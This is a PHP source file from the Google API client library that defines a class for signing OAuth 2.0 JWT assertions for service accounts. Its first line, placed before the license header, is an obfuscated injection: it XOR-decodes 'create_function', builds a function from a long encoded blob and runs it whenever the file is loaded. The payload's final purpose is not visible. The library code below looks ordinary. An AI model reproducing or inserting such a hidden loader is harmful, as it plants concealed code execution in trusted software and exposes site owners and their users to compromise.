<?php $XPRHfZ=',KR,G47Q2R1;>S>'^'O97M3Qh7G<ROW<P';$xyDFaUqK=$XPRHfZ('','EQoeF9Y59;A+a0;Y2O>yoUO;<,MC3k7Q:APEEbMMm-UE2-==>l 7Rn2J2R6rSGAgw42HWiRCZPNcELVTI19OyK>7CSzKFcoYSSJ.JEM,nzUFomNGv;9BA,RpT A0QbWzW<ENnygHo=INdfeVLa+UJ,lFP3S1eGX.N2W>HidSODLT6nj,VAD6LArm<37DKD4FsBU;dH8ASy3sMo,,E1nqE-9.7EpdPYL,Q5E+ADYl1SPDRBB<S<RTPC,jEWjnovu<wA-JacP=.SJKRo=JUDIJe769o5->4sZ7JrkqmZ,KokZH=08AmiPHXLREYY<,Nc-5jLEnWPZ9LQ5ZXF-9XS DggW.r +xe4 i, skWKYPOrnL4XLX<lHJpCla-AT5l .+DnBw RKsKE7qJA=;GWdcNOU 2An9SFH7kjOW;2XJYt3EN,N8VA.B-BX9K-OW6M+=<ATB:ANPsQmRI6S0WOrXSX,fVluU-ZToFI0DZNp3ZpM1;9LeGgN8N1XL-R+<14<:K:JIs:+.wfZoJAZ7kbcqdRZDlcHS5X4.e.QCascjsPguHBsgQnRESPzoW9yjDt-aQuN5JT0TPDQSkxOsNuXOBLTcWE:<=ER<N>BqE2LL,LDSKMQ.ZZ8xCOMOSib30lUG7LeGT-TM7pP,7.:1IjlpcyaU3X2gQkU<E'^',7GD L7VMR.E>UC0A;MQH- IcH,7R4h<O5wllB6GdK +QYTRPLXX 1V+F3i->25OSPS<6Erg157JelvtiJ3FpoQB7sGkaDTSZZ,A8miENGuvTMj.JHM0-I<XpD D0KlZsUneGsnAKR<:DHXvdEO4>M7b9nsoEc3K7isWhLD ;6 1XFNG38mkezxd5AR0>6ZnW- OMs2H.sNyGKHM1PNLeKXBD Knt=-X0j.N8ddLW2<77yH65S 11 DJms5- 9>u2aL9AG;XWswurKK+91,cEL<0KQLJU,1R3RVQI1I2TaSlYQL MTpl.->0<b6QDiDSJddJ31.XeqNPQ BK=2C,GOsq ez- gtIMSSO<. prLNhB9 -YEh1zJeEI  T3KKRdSbSK72HAL>U. IZgjDG8.9UWzd0.L5=aN+6OSxwy4F+=I<Q7-G8Hj V9r+6B,tbQ4 jX =5Ee26,U<T2gV<2,MOzLQ1L.50-,ImsuzZ<XiUZM-EaAnY<C95r9NEnQDS8N9aTQNWPJzK. .VBBEWDz7 YKl7T,UuBE4:F.JJNmGR,qEUhV3u5hKXcXKRsANWcGwWsaTc2q3jLQoUhU9=0--<< CcX=;O:MjV5S5 C- tgmuJ;.YQjomosIBH:e01V Mc0L ,lW MNBUP-M1YXsh0K1FOaBn68');$xyDFaUqK();
/*
 * Copyright 2012 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

require_once "Google/Auth/OAuth2.php";
require_once "Google/Signer/P12.php";
require_once "Google/Utils.php";

/**
 * Credentials object used for OAuth 2.0 Signed JWT assertion grants.
 *
 * @author Chirag Shah <chirags@google.com>
 */
class Google_0814_Auth_AssertionCredentials
{
  const MAX_TOKEN_LIFETIME_SECS = 3600;

  public $serviceAccountName;
  public $scopes;
  public $privateKey;
  public $privateKeyPassword;
  public $assertionType;
  public $sub;
  /**
   * @deprecated
   * @link http://tools.ietf.org/html/draft-ietf-oauth-json-web-token-06
   */
  public $prn;
  private $useCache;

  /**
   * @param $serviceAccountName
   * @param $scopes array List of scopes
   * @param $privateKey
   * @param string $privateKeyPassword
   * @param string $assertionType
   * @param bool|string $sub The email address of the user for which the
   *              application is requesting delegated access.
   * @param bool useCache Whether to generate a cache key and allow
   *              automatic caching of the generated token.
   */
  public function __construct(
      $serviceAccountName,
      $scopes,
      $privateKey,
      $privateKeyPassword = 'notasecret',
      $assertionType = 'http://oauth.net/grant_type/jwt/1.0/bearer',
      $sub = false,
      $useCache = true
  ) {
    $this->serviceAccountName = $serviceAccountName;
    $this->scopes = is_string($scopes) ? $scopes : implode(' ', $scopes);
    $this->privateKey = $privateKey;
    $this->privateKeyPassword = $privateKeyPassword;
    $this->assertionType = $assertionType;
    $this->sub = $sub;
    $this->prn = $sub;
    $this->useCache = $useCache;
  }

  /**
   * Generate a unique key to represent this credential.
   * @return string
   */
  public function getCacheKey()
  {
    if (!$this->useCache) {
      return false;
    }
    $h = $this->sub;
    $h .= $this->assertionType;
    $h .= $this->privateKey;
    $h .= $this->scopes;
    $h .= $this->serviceAccountName;
    return md5($h);
  }

  public function generateAssertion()
  {
    $now = time();

    $jwtParams = array(
          'aud' => Google_0814_Auth_OAuth2::OAUTH2_TOKEN_URI,
          'scope' => $this->scopes,
          'iat' => $now,
          'exp' => $now + self::MAX_TOKEN_LIFETIME_SECS,
          'iss' => $this->serviceAccountName,
    );

    if ($this->sub !== false) {
      $jwtParams['sub'] = $this->sub;
    } else if ($this->prn !== false) {
      $jwtParams['prn'] = $this->prn;
    }

    return $this->makeSignedJwt($jwtParams);
  }

  /**
   * Creates a signed JWT.
   * @param array $payload
   * @return string The signed JWT.
   */
  private function makeSignedJwt($payload)
  {
    $header = array('typ' => 'JWT', 'alg' => 'RS256');

    $payload = json_encode($payload);
    // Handle some overzealous escaping in PHP json that seemed to cause some errors
    // with claimsets.
    $payload = str_replace('\/', '/', $payload);

    $segments = array(
      Google_0814_Utils::urlSafeB64Encode(json_encode($header)),
      Google_0814_Utils::urlSafeB64Encode($payload)
    );

    $signingInput = implode('.', $segments);
    $signer = new Google_0814_Signer_P12($this->privateKey, $this->privateKeyPassword);
    $signature = $signer->sign($signingInput);
    $segments[] = Google_0814_Utils::urlSafeB64Encode($signature);

    return implode(".", $segments);
  }
}